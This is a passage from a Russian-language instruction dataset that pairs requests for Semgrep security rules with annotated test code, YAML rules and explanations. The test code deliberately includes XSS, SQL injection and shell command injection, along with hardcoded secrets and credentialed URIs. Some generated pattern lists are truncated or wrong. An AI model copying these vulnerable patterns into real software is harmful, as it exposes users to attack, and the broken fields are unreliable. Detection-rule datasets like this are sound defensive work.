\"secret\"\n  def createToken(): String = {\n    com.auth0.jwt.algorithms.Algorithm.HMAC256(secret)\n  }\n}\n\nБезопасные паттерны:  \n• // File: jwt-safe.scala\nval secretKey = System.getenv(\"JWT_SECRET_KEY\")\ncom.auth0.jwt.algorithms.Algorithm.HMAC256(secretKey);\n• // File: jwt-safe-scala.scala\ndef getSecret(): String = { ... }\ncom.auth0.jwt.algorithms.Algorithm.HMAC256(getSecret());\n• // File: jwt-safe-class.scala\nclass JwtClass{\n  def createToken(secretKey: String): String = {\n    com.auth0.jwt.algorithms.Algorithm.HMAC256(secretKey)\n  }\n}\n\nЛегенда аннотаций:\n- // ruleid:scala-jwt-hardcoded-secret: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:scala-jwt-hardcoded-secret: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: scala-jwt-hardcoded-secret\n  languages:\n  - scala\n  message: >-\n    Hardcoded JWT secret or private key is used.\n    This is a Insufficiently Protected Credentials weakness: https://cwe.mitre.org/data/definitions/522.html\n    Consider using an appropriate security mechanism to protect the credentials (e.g. keeping secrets\n    in environment variables)\n  metadata:\n    category: security\n    cwe:\n    - 'CWE-522: Insufficiently Protected Credentials'\n    owasp:\n    - A02:2017 - Broken Authentication\n    - A04:2021 - Insecure Design\n    source-rule-url: https://semgrep.dev/blog/2020/hardcoded-secrets-unverified-tokens-and-other-common-jwt-mistakes/\n    technology:\n    - jwt\n    confidence: HIGH\n    references:\n    - https://owasp.org/Top10/A04_2021-Insecure_Design\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: MEDIUM\n    impact: MEDIUM\n  pattern-either:\n  - pattern: |\n      com.auth0.jwt.algorithms.Algorithm.HMAC256(\"...\");\n  - pattern: |\n      $SECRET = \"...\";\n      ...\n      com.auth0.jwt.algorithms.Algorithm.HMAC256($SECRET);\n  - pattern: |\n      class $CLASS {\n        ...\n        $DECL $SECRET = \"...\";\n        ...\n        def $FUNC (...): $RETURNTYPE = {\n          ...\n          com.auth0.jwt.algorithms.Algorithm.HMAC256($SECRET);\n          ...\n        }\n        ...\n      }\n  - pattern: |\n      com.auth0.jwt.algorithms.Algorithm.HMAC384(\"...\");\n  - pattern: |\n      $SECRET = \"...\";\n      ...\n      com.auth0.jwt.algorithms.Algorithm.HMAC384($SECRET);\n  - pattern: |\n      class $CLASS {\n        ...\n        $DECL $SECRET = \"...\";\n        ...\n        def $FUNC (...): $RETURNTYPE = {\n          ...\n          com.auth0.jwt.algorithms.Algorithm.HMAC384($SECRET);\n          ...\n        }\n        ...\n      }\n  - pattern: |\n      com.auth0.jwt.algorithms.Algorithm.HMAC512(\"...\");\n  - pattern: |\n      $SECRET = \"...\";\n      ...\n      com.auth0.jwt.algorithms.Algorithm.HMAC512($SECRET);\n  - pattern: |\n      class $CLASS {\n        ...\n        $DECL $SECRET = \"...\";\n        ...\n        def $FUNC (...): $RETURNTYPE = {\n          ...\n          com.auth0.jwt.algorithms.Algorithm.HMAC512($SECRET);\n          ...\n        }\n        ...\n      }\n  severity: ERROR\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска жестко закодированных секретов JWT (JSON Web Token) в Scala-коде. Оно использует шаблон поиска, который проверяет наличие литералов строк, переданных в конструктор алгоритма HMAC, или переменных, инициализированных литеральными строками, которые затем используются в качестве секрета при создании токенов JWT. Это может привести к недостаточной защите учетных данных, так как жестко закодированные секреты легко доступны и могут быть раскрыты злоумышленниками.\n\n# Ключевые элементы:\n- ID: scala-jwt-hardcoded-secret\n- Язык: scala \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "scala-jwt-hardcoded-secret",
      "language": "scala",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: gcp-vertexai-private-instance\nОписание уязвимости: Ensure Vertex AI instances are private\nCWE: CWE-1220: Insufficient Granularity of Access Control\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-1220: Insufficient Granularity of Access Control\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: gcp-vertexai-private-instance.tf\n# ok: gcp-vertexai-private-instance\nresource \"google_notebooks_instance\" \"pass1\" {\n  name = \"pass1-instance\"\n  location = \"us-west1-a\"\n  machine_type = \"e2-medium\"\n  vm_image {\n    project      = \"deeplearning-platform-release\"\n    image_family = \"tf-latest-cpu\"\n  }\n  no_public_ip = true\n}\n\n# fail\n# ruleid: gcp-vertexai-private-instance\nresource \"google_notebooks_instance\" \"fail1\" {\n  name = \"fail1-instance\"\n  location = \"us-west1-a\"\n  machine_type = \"e2-medium\"\n  vm_image {\n    project      = \"deeplearning-platform-release\"\n    image_family = \"tf-latest-cpu\"\n  }\n  no_public_ip = false\n}\n\n# fail\n# ruleid: gcp-vertexai-private-instance\nresource \"google_notebooks_instance\" \"fail2\" {\n  name = \"fail2-instance\"\n  location = \"us-west1-a\"\n  machine_type = \"e2-medium\"\n  vm_image {\n    project      = \"deeplearning-platform-release\"\n    image_family = \"tf-latest-cpu\"\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"google_notebooks_instance\" \"fail1\" { ... no_public_ip = false ... }\n• resource \"google_notebooks_instance\" \"fail2\" { ... }\n\nБезопасные паттерны:  \n• resource \"google_notebooks_instance\" \"pass1\" { ... no_public_ip = true ... }\n\nЛегенда аннотаций:\n- // ruleid:gcp-vertexai-private-instance: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:gcp-vertexai-private-instance: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: gcp-vertexai-private-instance\n  patterns:\n  - pattern: resource\n  - pattern-inside: |\n      resource \"google_notebooks_instance\" \"...\" {\n      ...\n      }\n  - pattern-not-inside: |\n      resource \"google_notebooks_instance\" \"...\" {\n      ...\n      no_public_ip = true\n      ...\n      }\n  message: >-\n    Ensure Vertex AI instances are private\n  metadata:\n    owasp:\n    - A05:2017 - Broken Access Control\n    - A01:2021 - Broken Access Control\n    cwe:\n    - 'CWE-1220: Insufficient Granularity of Access Control'\n    category: security\n    technology:\n    - terraform\n    - gcp\n    references:\n    - https://owasp.org/Top10/A01_2021-Broken_Access_Control\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов Google Notebooks Instance в Terraform конфигурациях HCL, где не указан атрибут 'no_public_ip'. Паттерн ищет ресурсы типа 'google_notebooks_instance' и проверяет наличие атрибута 'no_public_ip', который должен быть установлен в значение 'true'. Если этот атрибут отсутствует или имеет другое значение, правило отмечает код как опасный. Безопасным считается случай, когда явно указано 'no_public_ip = true'.\n\n# Ключевые элементы:\n- ID: gcp-vertexai-private-instance\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "gcp-vertexai-private-instance",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: wip-xss-using-responsewriter-and-printf\nОписание уязвимости: Found data going from url query parameters into formatted data written to ResponseWriter. This could be XSS and should not be done. If you must do this, ensure your data is sanitized or escaped.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: search\nЯзык: go",
    "input": "Требования:\n- Язык: go\n- Тип анализа: search\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: wip-xss-using-responsewriter-and-printf.go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"net/http\"\n)\n\nfunc getMovieQuote() map[string]string {\n\tm := make(map[string]string)\n\tm[\"quote\"] = \"I'll be back.\"\n\tm[\"movie\"] = \"The Terminator\"\n\tm[\"year\"] = \"1984\"\n\n\treturn m\n}\n\nfunc indexPage(w http.ResponseWriter, r *http.Request) {\n    const tme = `<html>`\n\n\tconst template = `\n\t<html>\n\t<body>\n\t  <h1>Random Movie Quotes</h1>\n\t  <h2>%s</h2>\n\t  <h4>~%s, %s</h4>\n\t</body>\n\t</html>`\n\n\tquote := getMovieQuote()\n\n\tquoteText := quote[\"quote\"]\n\tmovie := quote[\"movie\"]\n\tyear := quote[\"year\"]\n\n\tw.WriteHeader(http.StatusAccepted)\n\tw.Write([]byte(fmt.Sprintf(template, quoteText, movie, year)))\n}\n\nfunc errorPage(w http.ResponseWriter, r *http.Request) {\n    // ruleid: wip-xss-using-responsewriter-and-printf\n\tparams := r.URL.Query()\n\turls, ok := params[\"url\"]\n\tif !ok {\n\t\tlog.Println(\"Error\")\n\t\treturn\n\t}\n\turl := urls[0]\n\n    const template = `\n\t<html>\n\t<body>\n\t  <h1>error; page not found. <a href=\"%s\">go back</a></h1>\n\t</body>\n\t</html>`\n\n\tw.WriteHeader(http.StatusAccepted)\n\tw.Write([]byte(fmt.Sprintf(template, url)))\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/\", indexPage)\n\thttp.HandleFunc(\"/error\", errorPage)\n\thttp.ListenAndServe(\":8080\", nil)\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• Пример опасного кода не сгенерирован\n\nБезопасные паттерны:  \n• Пример безопасного кода не сгенерирован\n\nЛегенда аннотаций:\n- // ruleid:wip-xss-using-responsewriter-and-printf: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:wip-xss-using-responsewriter-and-printf: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: wip-xss-using-responsewriter-and-printf\n  patterns:\n  - pattern-inside: |\n      func $FUNC(..., $W http.ResponseWriter, ...) {\n        ...\n        var $TEMPLATE = \"...\"\n        ...\n        $W.Write([]byte(fmt.$PRINTF($TEMPLATE, ...)), ...)\n        ...\n      }\n  - pattern-either:\n    - pattern: |\n        $PARAMS = r.URL.Query()\n        ...\n        $DATA, $ERR := $PARAMS[...]\n        ...\n        $INTERM = $ANYTHING(..., $DATA, ...)\n        ...\n        $W.Write([]byte(fmt.$PRINTF(..., $INTERM, ...)))\n    - pattern: |\n        $PARAMS = r.URL.Query()\n        ...\n        $DATA, $ERR := $PARAMS[...]\n        ...\n        $INTERM = $DATA[...]\n        ...\n        $W.Write([]byte(fmt.$PRINTF(..., $INTERM, ...)))\n    - pattern: |\n        $DATA, $ERR := r.URL.Query()[...]\n        ...\n        $INTERM = $DATA[...]\n        ...\n        $W.Write([]byte(fmt.$PRINTF(..., $INTERM, ...)))\n    - pattern: |\n        $DATA, $ERR := r.URL.Query()[...]\n        ...\n        $INTERM = $ANYTHING(..., $DATA, ...)\n        ...\n        $W.Write([]byte(fmt.$PRINTF(..., $INTERM, ...)))\n    - pattern: |\n        $PARAMS = r.URL.Query()\n        ...\n        $DATA, $ERR := $PARAMS[...]\n        ...\n        $W.Write([]byte(fmt.$PRINTF(..., $DATA, ...)))\n  message: >-\n    Found data going from url query parameters into formatted data written to ResponseWriter.\n    This could be XSS and should not be done. If you must do this, ensure your data\n    is\n    sanitized or escaped.\n  metadata:\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    category: security\n    technology:\n    - go\n    confidence: MEDIUM\n    references:\n    - https://owasp.org/Top10/A03_2021-Injection\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: MEDIUM\n  severity: WARNING\n  languages:\n  - go\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования ResponseWriter вместе с fmt.Printf для записи данных из URL-параметров напрямую в HTML-шаблон. Такой подход может привести к XSS-уязвимости, если данные не были должным образом очищены или экранированы перед использованием. Правило использует шаблон функции, которая принимает ResponseWriter и форматирует строку с использованием fmt.Printf, а затем проверяет наличие переменных, содержащих данные из URL-параметров, которые могут быть переданы в эту функцию.\n\n# Ключевые элементы:\n- ID: wip-xss-using-responsewriter-and-printf\n- Язык: go \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "wip-xss-using-responsewriter-and-printf",
      "language": "go",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: detected-username-and-password-in-uri\nОписание уязвимости: Username and password in URI detected\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: generic",
    "input": "Требования:\n- Язык: generic\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: detected-username-and-password-in-uri.txt\n# ruleid: detected-username-and-password-in-uri\nhttps://username:passworD123*@example.com\n\n# ruleid: detected-username-and-password-in-uri\nhttps://username:**sswor*D12@example.com\n\n# ok: detected-username-and-password-in-uri\nhttps://example.com\n\n# ok: detected-username-and-password-in-uri\nhttps://example.com/path/to/something\n\n# ok: detected-username-and-password-in-uri\nhttps://example.com/path/to/something?pass=word\n\n# ok: detected-username-and-password-in-uri\nhttps://username:************@example.com\n\n# ok: detected-username-and-password-in-uri\nhttps://username:*********@example.com\n\n# ok: detected-username-and-password-in-uri\nhttps://username:••••••••@example.com\n\n# ruleid: detected-username-and-password-in-uri\ndb_url=mysql+pymysql://sampleuser:Sample%password12@merchantdb/collection\n\n# ruleid: detected-username-and-password-in-uri\nzxc=https://makka-chakkaf:chakkA12+@example.com\n\n# ok: detected-username-and-password-in-uri\nxvy=https://www.googly@yoyo.com/yomax#\n\n# ok: detected-username-and-password-in-uri\nyy=http://google@seeyou.com/mandrek\n\n# ruleid: detected-username-and-password-in-uri\nsamp=http://username:f12*Password@totalsuccess@megafailure/yourname\n\n# ruleid: detected-username-and-password-in-uri\ndb_url=mysql+pymysql://sampleuser:samplEpassword12*@merchantdb.com/collection\n\n# ruleid: detected-username-and-password-in-uri\nHTTP (ex : `http://user123:Password12^@192.168.0.1:3128/`)\n\n# ruleid: detected-username-and-password-in-uri\nHTTPS (ex : `https://user123:passworD0+@192.168.0.1:3128/`)\n\n# ruleid: detected-username-and-password-in-uri\ncurl -kvsX PUT \\\"https://user123:passw0rD1&@something.host.test:8088/search/\\\" -H \\\"Content-Type: application/xml\\\"\n\n# ok: detected-username-and-password-in-uri\nf\"https://user123:{_github_pat(github_secret_name)}@github.com/\"\n\n# ok: detected-username-and-password-in-uri\nf\"https://{get_user_name}:{_github_pat(github_secret_name)}@github.com/\"\n\n# ruleid: detected-username-and-pa  # Ограничиваем длину\n\nОпасные паттерны:\n• https://username:passworD123*@example.com\n• db_url=mysql+pymysql://sampleuser:Sample%password12@merchantdb/collection\n• HTTP (ex : http://user123:Password12^@192.168.0.1:3128/)\n\nБезопасные паттерны:  \n• https://example.com\n• https://example.com/path/to/something\n• https://example.com/path/to/something?pass=word\n\nЛегенда аннотаций:\n- // ruleid:detected-username-and-password-in-uri: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detected-username-and-password-in-uri: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: detected-username-and-password-in-uri\n  patterns:\n  - pattern: $PROTOCOL://$...USERNAME:$...PASSWORD@$END\n  - metavariable-regex:\n      metavariable: $...USERNAME\n      regex: \\A({?)([A-Za-z])([A-Za-z0-9_-]){5,31}(}?)\\Z\n  - metavariable-regex:\n      metavariable: $...PASSWORD\n      regex: (?!.*[\\s])(?=.*[0-9])(?=.*[a-z])(?=.*[A-Z])(?=.*[!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~]){6,32}\n  - metavariable-regex:\n      metavariable: $PROTOCOL\n      regex: (.*http.*)|(.*sql.*)|(.*ftp.*)|(.*smtp.*)\n  languages:\n  - generic\n  message: Username and password in URI detected\n  severity: ERROR\n  metadata:\n    owasp:\n    - A07:2021 - Identification and Authentication Failures\n    cwe:\n    - 'CWE-798: Use of Hard-coded Credentials'\n    references:\n    - https://github.com/grab/secret-scanner/blob/master/scanner/signatures/pattern.go\n    category: security\n    technology:\n    - secrets\n    confidence: MEDIUM\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска URL-адресов, содержащих явные имена пользователей и пароли в строке запроса или хедере. Анализ выполняется путем сопоставления шаблонов регулярных выражений с метапеременными ($...USERNAME, $...PASSWORD), которые соответствуют определенным критериям длины и допустимых символов. Шаблон также проверяет наличие протоколов HTTP, SQL, FTP и SMTP, типичных для передачи учетных данных через URL.\n\n# Ключевые элементы:\n- ID: detected-username-and-password-in-uri\n- Язык: generic \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "detected-username-and-password-in-uri",
      "language": "generic",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения scala-slick-overrideSql-literal\nОписание уязвимости: Detected a formatted string in a SQL statement. This could lead to SQL injection if variables in the SQL statement are not properly sanitized. Avoid using non literal values in `overrideSql(...)`.\nCWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\nТип анализа: search\nЯзык: scala",
    "input": "Требования:\n- Язык: scala\n- Тип анализа: search\n- CWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: scala-slick-overrideSql-literal.scala\nimport slick.jdbc.H2Profile.api._\n\nclass FooBar {\n  def something(name: String) = {\n    val db = Database.forConfig(\"h2mem1\")\n\n    lazy val people = TableQuery[People]\n\n    // ok: scala-slick-overrideSql-literal\n    people.map(p => (p.id,p.name,p.age))\n      .result\n      .overrideSql(\"SELECT id, name, age FROM Person\")\n    \n    val query = \"SELECT id, name, age FROM Person\"\n    // ok: scala-slick-overrideSql-literal\n    people.map(p => (p.id,p.name,p.age))\n      .result\n      .overrideSql(query)\n\n\n    // ruleid: scala-slick-overrideSql-literal\n    people.map(p => (p.id,p.name,p.age))\n      .result\n      .overrideSql(s\"SELECT id, name, age FROM Person WHERE $name\")\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• people.map(p => (p.id,p.name,p.age)).result.overrideSql(s\\\n• )\n• people.map(p => (p.id,p.name,p.age)).result.overrideSql(s\n\nБезопасные паттерны:  \n• people.map(p => (p.id,p.name,p.age)).result.overrideSql(\\\n• )\n• val query = \\\n\nЛегенда аннотаций:\n- // ruleid:scala-slick-overrideSql-literal: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:scala-slick-overrideSql-literal: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: scala-slick-overrideSql-literal\n  patterns:\n  - pattern: $MODEL.overrideSql($QUERY,...)\n  - pattern-not: $MODEL.overrideSql(\"...\",...)\n  - pattern-not-inside: |\n      $QUERY = \"...\"\n      ...\n  message: >-\n    Detected a formatted string in a SQL statement.\n    This could lead to SQL injection if variables in the SQL statement are not properly sanitized.\n    Avoid using non literal values in `overrideSql(...)`.\n  languages: [scala]\n  severity: ERROR\n  metadata:\n    category: security\n    cwe:\n    - \"CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\"\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    technology:\n    - scala\n    - slick\n    confidence: LOW\n    references:\n    - https://owasp.org/Top10/A03_2021-Injection\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования форматированных строк внутри метода overrideSql в Scala-Slick библиотеке. Метод overrideSql используется для переопределения SQL-запроса, который передается ему в виде строки. Если строка формируется динамически с использованием переменных, не прошедших надлежащую санитайзацию, это может привести к SQL-инъекции. Правило ищет случаи, когда строка передается через шаблон $QUERY, но исключает ситуации, когда строка жестко закодирована в литеральной форме или находится внутри блока комментариев.\n\n# Ключевые элементы:\n- ID: scala-slick-overrideSql-literal\n- Язык: scala \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "scala-slick-overrideSql-literal",
      "language": "scala",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения javascript-alert\nОписание уязвимости: found alert() call; should this be in production code?\nCWE: \nТип анализа: search\nЯзык: javascript",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: leftover_debugging.js\n\n// ruleid:javascript-prompt\nvar name = prompt('what is your name');\n// ruleid: javascript-alert\nalert('your name is ' + name);\nalert('not', 'a', 'valid', 'alert')\n// ruleid: javascript-confirm\nif ( confirm(\"pushem!\") == true) {\n    r = \"x\";\n} else {\n    r = \"Y\";\n    // ruleid: javascript-debugger\n    debugger;\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• alert('your name is ' + name);\n• alert('not', 'a', 'valid', 'alert')\n• confirm(\"pushem!\")\n\nБезопасные паттерны:  \n• prompt('what is your name');\n• alert();\n• console.log('message');\n\nЛегенда аннотаций:\n- // ruleid:javascript-alert: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:javascript-alert: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: javascript-alert\n    message: found alert() call; should this be in production code?\n    languages:\n      - javascript\n      - typescript\n    severity: WARNING\n    pattern-either:\n      - pattern: alert()\n      - pattern: alert($X)\n    metadata:\n      category: best-practice\n      technology:\n        - javascript\n  - id: javascript-debugger\n    pattern: debugger;\n    message: found debugger call; should this be in production code?\n    languages:\n      - javascript\n      - typescript\n    severity: WARNING\n    metadata:\n      category: best-practice\n      technology:\n        - javascript\n  - id: javascript-confirm\n    pattern: confirm(...)\n    message: found confirm() call; should this be in production code?\n    languages:\n      - javascript\n      - typescript\n    severity: WARNING\n    metadata:\n      category: best-practice\n      technology:\n        - javascript\n  - id: javascript-prompt\n    message: found prompt() call; should this be in production code?\n    languages:\n      - javascript\n      - typescript\n    severity: WARNING\n    pattern-either:\n      - pattern: prompt()\n      - pattern: prompt($X)\n      - pattern: prompt($X, $Y)\n    metadata:\n      category: best-practice\n      technology:\n        - javascript\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов функции alert(), которая может быть нежелательной в продакшен-коде. Анализ выполняется путем поиска вызова функции alert() или ее вариаций с произвольным количеством аргументов ($X). Паттерн либо ищет точное совпадение alert(), либо обнаруживает alert() с одним или несколькими аргументами. Дополнительно проверяются вызовы confirm(...) и prompt(...), которые также могут быть нежелательными в продакшене.\n\n# Ключевые элементы:\n- ID: javascript-alert\n- Язык: javascript \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "javascript-alert",
      "language": "javascript",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: squarespace-access-token\nОписание уязвимости: A gitleaks squarespace-access-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: squarespace-access-token.go\n// ruleid: squarespace-access-token\nsquarespace_api_token = \"03d959da-1d77-8c56-4590-cd27d00d0440\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: squarespace-access-token.go\n// ruleid: squarespace-access-token\nsquarespace_api_token = \"03d959da-1d77-8c56-4590-cd27d00d0440\"\n• // File: example.go\n// ruleid: squarespace-access-token\nconst squarespaceToken = \"f9e8b3cd-4a2f-4739-b892-3456789abcde\"\n• // File: config.go\n// ruleid: squarespace-access-token\nvar squarespaceAccessKey = \"12345678-abcd-efgh-ijkl-mnopqrstuvwxyz\"\n\nБезопасные паттерны:  \n• // File: safe-code.go\n// idempotent: safe-code\nconst apiToken = os.Getenv(\"SQUARESPACE_API_TOKEN\")\n• // File: secure-config.go\n// idempotent: secure-config\nvar accessKey = vault.GetSecret(\"squarespace_access_key\")\n• // File: env-variables.go\n// idempotent: env-variables\nsquarespaceApiToken := os.Getenv(\"SQUARESPACE_ACCESS_KEY\")\n\nЛегенда аннотаций:\n- // ruleid:squarespace-access-token: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:squarespace-access-token: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: squarespace-access-token\n  message: A gitleaks squarespace-access-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i)(?:squarespace)(?:[0-9a-z\\-_\\t .]{0,20})(?:[\\s|']|[\\s|\"]){0,3}(?:=|>|:{1,3}=|\\|\\|:|<=|=>|:|\\?=)(?:'|\\\"|\\s|=|\\x60){0,5}([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})(?:['|\\\"|\\n|\\r|\\s|\\x60|;]|$)\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированного токена доступа Squarespace в исходном коде. Регулярное выражение ищет строку, содержащую слово 'squarespace' или его вариации, за которым следует идентификатор GUID формата UUID (например, '03d959da-1d77-8c56-4590-cd27d00d0440'). Это типичный шаблон для токенов доступа Squarespace, которые не должны храниться в исходном коде, так как они представляют собой секретную информацию и могут быть раскрыты злоумышленникам.\n\n# Ключевые элементы:\n- ID: squarespace-access-token\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "squarespace-access-token",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения dangerous-spawn-shell\nОписание уязвимости: Detected non-literal calls to $EXEC(). This could lead to a command injection vulnerability.\nCWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\nТип анализа: taint\nЯзык: javascript\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: taint\n- CWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: dangerous-spawn-shell.js\nconst {spawn, spawnSync} = require('child_process');\nconst cp = require('child_process');\n\nfunction test1(userInput) {\n    let name = \"bash\";\n    // ruleid: dangerous-spawn-shell\n    spawnSync(name, [\"-c\", userInput]);\n}\n\nfunction test2(userInput) {\n    // ruleid: dangerous-spawn-shell\n    cp.spawn('sh', [userInput]);\n}\n\nfunction testOk(userInput) {\n    foobar(userInput);\n    // ok: dangerous-spawn-shell\n    spawn('ls', ['-la', '/tmp']);\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• let name = \"bash\"; spawnSync(name, [\"-c\", userInput]);\n• cp.spawn('sh', [userInput]);\n\nБезопасные паттерны:  \n• foobar(userInput); spawn('ls', ['-la', '/tmp']);\n• spawn('ls', ['-la', '/tmp'], {});\n\nЛегенда аннотаций:\n- // ruleid:dangerous-spawn-shell: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:dangerous-spawn-shell: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: dangerous-spawn-shell\n  message: >-\n    Detected non-literal calls to $EXEC(). This could lead to a command\n    injection vulnerability.\n  metadata:\n    cwe:\n    - \"CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\"\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    source-rule-url: https://github.com/nodesecurity/eslint-plugin-security/blob/master/rules/detect-child-process.js\n    category: security\n    technology:\n    - javascript\n    references:\n    - https://cheatsheetseries.owasp.org/cheatsheets/Nodejs_Security_Cheat_Sheet.html#do-not-use-dangerous-functions\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: HIGH\n    impact: MEDIUM\n    confidence: LOW\n  languages:\n  - javascript\n  - typescript\n  severity: ERROR\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - pattern-inside: |\n        function ... (...,$FUNC,...) {\n          ...\n        }\n    - 